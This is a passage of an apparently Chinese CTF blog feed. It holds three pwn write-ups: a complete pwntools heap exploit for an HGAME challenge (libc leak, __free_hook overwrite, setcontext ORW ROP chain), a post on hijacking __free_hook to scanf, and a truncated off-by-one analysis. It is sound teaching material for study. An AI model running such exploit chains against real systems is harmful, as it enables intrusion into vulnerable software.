class="number">000000000005316</span>D <span class="number">4</span>C <span class="number">8B</span> <span class="number">42</span> <span class="number">28</span>                   mov     r8, [rdx+<span class="number">28</span>h]</span><br><span class="line">.text:<span class="number">0000000000053171</span> <span class="number">4</span>C <span class="number">8B</span> <span class="number">4</span>A <span class="number">30</span>                   mov     r9, [rdx+<span class="number">30</span>h]</span><br><span class="line">.text:<span class="number">0000000000053175</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">92</span> <span class="number">88</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     rdx, [rdx+<span class="number">88</span>h]</span><br><span class="line">.text:<span class="number">0000000000053175</span>                               ; &#125; <span class="comment">// starts at 53030</span></span><br><span class="line">.text:<span class="number">000000000005317</span>C                               ; __unwind &#123;</span><br><span class="line">.text:<span class="number">000000000005317</span>C <span class="number">31</span> C0                         xor     eax, eax</span><br><span class="line">.text:<span class="number">000000000005317</span>E C3                            retn</span><br></pre></td></tr></table></figure><ul><li>需要注意的是，若调用<code>open</code>函数报错，可以尝试<code>pop_rax_ret</code>+<code>syscall</code>进行系统调用。</li><li><code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-3.hgame.lwsec.cn&quot;</span>,<span class="number">30475</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x12&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">lb=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span>-<span class="number">0x12</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&quot;lb=&quot;</span>+<span class="built_in">hex</span>(lb))</span><br><span class="line"></span><br><span class="line">bin_num=lb+<span class="number">1979008</span>+<span class="number">80</span></span><br><span class="line">free_hook=lb+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x600</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(bin_num-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x600</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">key=u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">fk=free_hook^key</span><br><span class="line">log.success(<span class="string">&quot;key=&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(fk))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x600</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x600</span>)</span><br><span class="line"></span><br><span class="line">rdi2rdx=lb+<span class="number">0x000000000014b760</span></span><br><span class="line">setcontext=lb+<span class="number">0x5306D</span></span><br><span class="line">ret=lb+<span class="number">0x0000000000026699</span></span><br><span class="line">pop_rdi=lb+<span class="number">0x000000000002858f</span></span><br><span class="line">pop_rsi=lb+<span class="number">0x000000000002ac3f</span></span><br><span class="line">pop_rdx_r12=lb+<span class="number">0x0000000000114161</span></span><br><span class="line">pop_rax=lb+<span class="number">0x0000000000045580</span></span><br><span class="line">syscall=lb+<span class="number">0x00108D55</span></span><br><span class="line">read=lb+libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write=lb+libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line">heap=key*<span class="number">0x1000</span>+<span class="number">0x1f0</span></span><br><span class="line">edit(<span class="number">7</span>,p64(rdi2rdx))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0</span>)+p64(heap))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span>+p64(<span class="number">0</span>)+p64(setcontext)+p64(<span class="number">1</span>)*<span class="number">15</span>+p64(heap+<span class="number">0xc0</span>-<span class="number">0x10</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(heap+<span class="number">0x10</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">2</span>)+p64(syscall)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(heap+<span class="number">0x28</span>)+p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(read)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(write)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;b *&#123;&#125;&quot;.format(setcontext))</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="WEEK4"><a href="#WEEK4" class="headerlink" title="WEEK4"></a>WEEK4</h1><h2 id="pwn-3"><a href="#pwn-3" class="headerlink" title="pwn"></a>pwn</h2><h3 id="without-look"><a href="#without-look" class="headerlink" title="without_look"></a>without_look</h3><p><a href="https://www.cnblogs.com/LynneHuan/p/16387344.html">house of apple  by Lynne</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;复健。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="wp" scheme="http://example.com/categories/ctf/wp/"/>
    
    
    <category term="house_of_botcake" scheme="http://example.com/tags/house-of-botcake/"/>
    
  </entry>
  
  <entry>
    <title>scanf_attacker？</title>
    <link href="http://example.com/2022/09/02/scanf-hijacker/"/>
    <id>http://example.com/2022/09/02/scanf-hijacker/</id>
    <published>2022-09-02T01:55:51.000Z</published>
    <updated>2023-01-18T11:51:32.893Z</updated>
    
    <content type="html"><![CDATA[<p>一切都源于某个中午的突发奇想~</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/195106/24/27337/22482/631163bdE235b1360/0af342924109996b.png" style="zoom:80%;" /><span id="more"></span><h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>众所周知，在较低的<code>libc</code>版本（2.34之前）下进行<code>orw</code>利用一般是把<code>__free_hook</code>劫持为<code>setcontext</code>进行栈迁移（现在还需要跳板<code>gadget</code>完成<code>rdx</code>到<code>rdi</code>的转变），堆的各项布局对于我这个想寄就寄的菜鸟来说真是心力憔悴。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/128154/12/29279/36057/63116848Ea2f34b05/b991a211c9e5b641.jpg" style="zoom: 33%;" /><p>转念一想<code>free(buf)</code>中的<code>buf</code>是人为可控的，<code>free</code>也可以由<code>__free_hook</code>被劫持为某个函数。刚好当时国赛出题出的就是有关格式化字符串<code>printf</code>和<code>scanf</code>的漏洞利用，就有了这样的想法——<code>free(buf)</code>===&gt;<code>scanf(buf)</code>，其中<code>buf</code>堆块中存放着<code>%n$s</code>来对准<code>rbp</code>链在函数返回地址处直接构造<code>orw</code>。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/47026/25/21037/41527/63116b98Eb9f9e80a/f3f24576b5844d4a.jpg" style="zoom: 25%;" /><h2 id="scanf格式化字符串漏洞"><a href="#scanf格式化字符串漏洞" class="headerlink" title="scanf格式化字符串漏洞"></a>scanf格式化字符串漏洞</h2><p>利用<code>scanf(%n$s)</code>可以对偏移为<code>n</code>的栈上<strong>指针</strong>指向处进行<strong>任意长度</strong>的输入。常见利用手法有：</p><ol><li>栈上若残留<code>IO</code>指针可进行<code>IO_ATTACK</code>泄露<code>libc</code></li><li>利用<code>rbp</code>链构造<code>rop</code>，直接避开了<code>rbp</code>链前的<code>canary</code></li></ol><h2 id="试验"><a href="#试验" class="headerlink" title="试验"></a>试验</h2><p>于是兴致勃勃地跑去用<a href="https://anza2001.github.io/2022/08/14/off-by-one/">上次刚复盘过的题目</a>进行试验：</p><p>下图为已劫持<code>__free_hook</code>为<code>scanf</code>，正在尝试执行<code>scanf(&#39;%8$s&#39;)</code>操作（8为<code>rbp</code>链的偏移）：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/192749/27/27723/89623/63117202E1841821f/2f6f248266f3fff7.png" style="zoom:80%;" /><p>送些垃圾数据过去，看一下栈的变化：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/215319/40/20778/119453/631173b3Ea84ff058/050099a11809f7d9.png" style="zoom:80%;" /><p>可以看到我们成功利用<code>rbp</code>链将<code>main</code>函数栈的返回地址给覆盖为了<code>anzaanza</code>，加上<code>scanf</code>也不会被<code>\x00</code>截断，所以直接构造<code>orw</code>并非难事。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ol><li><p>省去了对堆块的布局操作以及寻找<code>rdx</code>和<code>rdi</code>转变的<code>gadget</code>，简化为只需要爆破出固定偏移即可。</p></li><li><p>上次复盘时感觉<code>setcontext</code>和<code>orw</code>链需要在一个较大的堆块中进行布局，如果所给堆块较小的话，大概会提高利用的复杂程度（第一次利用<code>setcontext</code>解题，经验不足，可能是拙见）。而<code>scanf</code>可输入不限长，对参数堆块<code>buf</code>的大小也不做限制。</p></li><li><p>如果题目允许，则可不断申请、释放？相当于无限次格式化字符串漏洞（不论劫持为<code>scanf</code>还是<code>printf</code>），可以在栈上构造想要的地址，然后对其指向处进行修改等操作？</p></li></ol><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ol><li>试验过程中我们知道，在<code>delete</code>功能函数中利用<code>scanf</code>格式化漏洞利用只能修改到其<strong>父函数</strong>即<code>main</code>函数的返回地址，而许多题目都是直接<code>exit</code>退出了，不给<code>main</code>函数返回的机会。</li><li>会被<code>\x0a</code>截断，对<code>rop</code>链有要求。</li><li>大概更适用于<code>orw</code>，毕竟不开沙箱的话直接构造<code>system(&#39;/bin/sh&#39;)</code>就好。</li></ol><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><code>scanf(buf)</code>和<code>system(buf)</code>都是控制函数和其第一个参数，而后者被<code>sandbox</code>之后，前者还有用武之地（除非<code>orw</code>白名单）。不知能否配合<code>io_file</code>之类的利用手法，以及搭配起来是否比原解法更方便。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;一切都源于某个中午的突发奇想~&lt;/p&gt;
&lt;img src=&quot;https://kjimg10.360buyimg.com/ott/jfs/t1/195106/24/27337/22482/631163bdE235b1360/0af342924109996b.png&quot; style=&quot;zoom:80%;&quot; /&gt;</summary>
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>off-by-one</title>
    <link href="http://example.com/2022/08/14/off-by-one/"/>
    <id>http://example.com/2022/08/14/off-by-one/</id>
    <published>2022-08-14T01:07:26.000Z</published>
    <updated>2023-02-01T14:32:42.273Z</updated>
    
    <content type="html"><![CDATA[<p>赛前复盘一道<code>libc2.31</code>的<code>off-by-one</code>漏洞利用的题目。</p><span id="more"></span><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off-by-one"></a>off-by-one</h3><p>特殊的堆溢出漏洞，只溢出一个字节，从而影响下一个堆块的头部控制信息，即堆块的<code>size</code>位，利用思路往往是<strong>改大</strong>下一个堆块的<code>size</code>位，从而造成<strong>堆块重叠</strong>(overlapping)。</p><h3 id="overlapping"><a href="#overlapping" class="headerlink" title="overlapping"></a>overlapping</h3><p>将下一个堆块改大(一般改成<strong>unsortedbin</strong>的大小)后进行<strong>释放</strong>，利用<code>unsortedbin</code>中堆块可切割的性质，造成堆块重叠，同时可以泄露出<code>main_arena+96</code>。参考图如下：</p><p><img src="https://m.360buyimg.com/babel/jfs/t1/9162/38/19492/69695/62f87050E2853f706/edc2658491d52f8a.png"></p><h3 id="Gadget：setcontext"><a href="#Gadget：setcontext" class="headerlink" title="Gadget：setcontext"></a>Gadget：setcontext</h3><p>首先来看下<code>libc-2.27.so</code>中的<code>setcontext</code>：</p><img src="https://m.360buyimg.com/babel/jfs/t1/180383/9/27781/74057/62f87b1dE171bf553/952ab3795b63fd6b.png" style="zoom:80%;" /><p>只要我们控制住<code>rdi</code>寄存器且保证<code>rdi+0A0</code>和<code>rdi+0A8</code>处<strong>人为可控</strong>，便能控制程序执行流。在<code>rdi+0A8</code>用<code>ret</code>指令进行覆盖，<code>rdi+0A0</code>处构造<code>ROP</code>链。而我们通常将<code>__free_hook</code>劫持为<code>setcontext+53</code>，而<code>free(heap_ptr)</code>前会将<code>rdi</code>写入<code>heap_ptr</code>，因此<code>rdi</code>也可控。</p><p>再来看下<code>libc-2.31.so</code>中的<code>setcontext</code>：</p><img src="https://m.360buyimg.com/babel/jfs/t1/27026/15/19442/63240/62f87f68E2355543e/3e7fd59d3eb7948a.png" style="zoom:80%;" /><p>我们发现寄存器由<code>rdi</code>改为了<code>rdx</code>，这就意味着我们需要寻找另一个<code>gadget</code>作为跳板，如下：</p><img src="https://m.360buyimg.com/babel/jfs/t1/164191/21/29805/50170/62f8818aE389bea14/7a9e50a788d86bc3.png" style="zoom:80%;" /><h2 id="赛题详解"><a href="#赛题详解" class="headerlink" title="赛题详解"></a>赛题详解</h2><p>赛题出自第二届广东大学生网络安全大赛——midpwn。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/pwnpwnpwn/Libc2.31Training/midpwn$ checksec orz</span><br><span class="line">[*] &#x27;/home/fuzz/pwnpwnpwn/Libc2.31Training/midpwn/orz&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="基本功能模块"><a href="#基本功能模块" class="headerlink" title="基本功能模块"></a>基本功能模块</h3><p>典型的菜单题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. add new note.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. edit a  note.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. show a  note.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. delte a note.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5. exit        .&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Your choose which one?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>add</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">void</span> *heap; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= size0x20 )<span class="comment">//堆块上限为0x20</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = size0x20;</span><br><span class="line">      <span class="keyword">if</span> ( i == size0x20 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;no space left.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !*(&amp;heap_ptr + i) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please input note size : &quot;</span>);</span><br><span class="line">  size = input();</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">0x28</span> &amp;&amp; size != <span class="number">0xB0</span> )<span class="comment">//只允许申请0x28和0xb0大小的堆块</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your size is too small or too big.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  heap = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( heap &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;malloc error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *(&amp;heap_ptr + i) = heap;</span><br><span class="line">  heap_size[i] = size;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your note.&quot;</span>);</span><br><span class="line">  v3 = read(<span class="number">0</span>, *(&amp;heap_ptr + i), size);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> || v3 &gt; size )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;read error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>edit</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *<span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input note index.&quot;</span>);</span><br><span class="line">  v2 = input();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt;= size0x20 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hacker ! out !&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input new note.&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= heap_size[v2]; ++i )<span class="comment">//读入size+1个字节，存在off-by-one</span></span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, (heap_ptr[v2] + i), <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(heap_ptr[v2] + i) == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = (heap_ptr[v2] + i);</span><br><span class="line">      *result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>show</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input note index.&quot;</span>);</span><br><span class="line">  v1 = input();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= size0x20 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hacker ! out !&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, heap_ptr[v1], heap_size[v1]);<span class="comment">//打印堆内数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>delete</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input note index.&quot;</span>);</span><br><span class="line">  v1 = input();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= size0x20 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hacker ! out !&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(heap_ptr[v1]);</span><br><span class="line">  heap_ptr[v1] = <span class="number">0LL</span>;<span class="comment">//释放堆块，并将指针置零</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="基本漏洞"><a href="#基本漏洞" class="headerlink" title="基本漏洞"></a>基本漏洞</h3><p><code>off-by-one</code>漏洞存在于<code>edit</code>功能中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= heap_size[v2]; ++i )<span class="comment">//off-by-one</span></span><br><span class="line">  